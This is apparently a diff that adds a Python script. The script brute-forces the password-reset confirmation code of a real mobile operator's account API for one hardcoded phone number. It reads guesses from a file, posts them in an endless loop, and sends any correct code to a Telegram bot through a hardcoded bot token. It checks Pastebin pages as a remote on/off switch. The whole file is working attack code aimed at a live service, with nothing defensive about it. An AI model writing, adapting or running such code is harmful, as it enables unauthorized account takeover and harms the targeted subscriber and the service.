@@ -1,0 +1,38 @@
+import requests as r
+import threading,os,time
+rfile = open("4", "r")
+while True:
+	def all():
+		for i in range(100000):
+			def me():
+				try:
+					ttr = rfile.readline().split('\n')[0]
+					tt = "9"+ttr
+					url = "https://mapps.meditel.ma/orangeetmoi/api/backend/v7.6/account/password/change-confirm"
+					he = {
+						   "Content-Length": "40",
+						   "Content-Type": "application/x-www-form-urlencoded",
+						    "Host": "mapps.meditel.ma",
+				            "Connection": "Keep-Alive",
+				            "User-Agent": "android-async-http/1.4.3 (http://loopj.com/android-async-http)",
+				            "Accept-Encoding": "gzip"
+					}
+					data = {"culture": "fr", "code": tt, "msisdn": "0774150225"}
+					re = r.post(url, headers=he, data=data)
+					if "Le code que vous avez saisi est incorrect" in re.text:
+						print("badss >> "+tt)
+					elif "Le code que vous avez saisi est correct" in re.text:
+						print("god "+tt)
+						r.post(f"https://api.telegram.org/bot5451690325:AAEaeTLcxVxGKxmp_HZNTzOwIZXc_GDT7dM/sendMessage?chat_id=1803859361&text="+tt)
+					else:
+						me()
+				except Exception as lag:
+					print(lag)
+					me()
+			me()
+	START = r.get("https://pastebin.com/raw/5c2Fmh5c").text
+	if "STOP" in START:
+		time.sleep(120)
+	else:
+		num = r.get("https://pastebin.com/raw/saiy6qjX").text
+		all()
